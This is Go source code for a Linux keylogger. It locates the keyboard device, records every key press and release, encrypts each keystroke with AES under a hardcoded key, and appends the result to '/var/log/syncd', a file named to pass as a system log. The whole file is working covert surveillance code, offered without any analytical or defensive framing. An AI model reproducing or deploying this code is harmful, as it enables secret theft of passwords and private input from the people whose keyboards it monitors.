package main

import (
	"crypto/aes"
	"encoding/hex"
	"os"
	"strings"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

func main() {

	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	// logrus.Println("Found a keyboard at", keyboard)
	// init keylogger with keyboard
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	key := "thisis32bitlongpassphraseimusing"

	// c := EncryptAES([]byte(key), "qqqqqqqqqqqqqqqq")
	// Append2File("/bin/keys", c)

	// // write to keyboard example:
	// go func() {
	// 	time.Sleep(5 * time.Second)
	// 	// open text editor and focus on it, it should say "marin" and new line will be printed
	// 	keys := []string{"m", "a", "r", "i", "n", "ENTER"}
	// 	for _, key := range keys {
	// 		// write once will simulate keyboard press/release, for long press or release, lookup at Write
	// 		k.WriteOnce(key)
	// 	}
	// }()

	events := k.Read()

	// range of events
	for e := range events {
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				// fmt.Println("[event]  press  ", e.KeyString())
				if len(e.KeyString()) != 16 {
					padding := strings.Repeat(" ", 16-len(e.KeyString()))
					yek := e.KeyString()
					add := padding + yek
					c := EncryptAES([]byte(key), add)
					Append2File("/var/log/syncd", c)
				}
			}

			// if the state of key is released
			if e.KeyRelease() {
				if len(e.KeyString()) != 16 {
					padding := strings.Repeat(" ", 16-len(e.KeyString()))
					yek := e.KeyString()
					add := padding + yek
					c := EncryptAES([]byte(key), add)
					Append2File("/var/log/syncd", c)
				}
			}
			break
		}
		// k.Close()
	}
}

func Append2File(path string, text string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		panic(err)
	}

	defer f.Close()

	if _, err = f.WriteString(text + "\n"); err != nil {
		panic(err)
	}
}

func EncryptAES(key []byte, plaintext string) string {

	c, err := aes.NewCipher(key)
	CheckError(err)

	out := make([]byte, len(plaintext))

	c.Encrypt(out, []byte(plaintext))

	return hex.EncodeToString(out)
}

func CheckError(err error) {
	if err != nil {
		panic(err)
	}
}
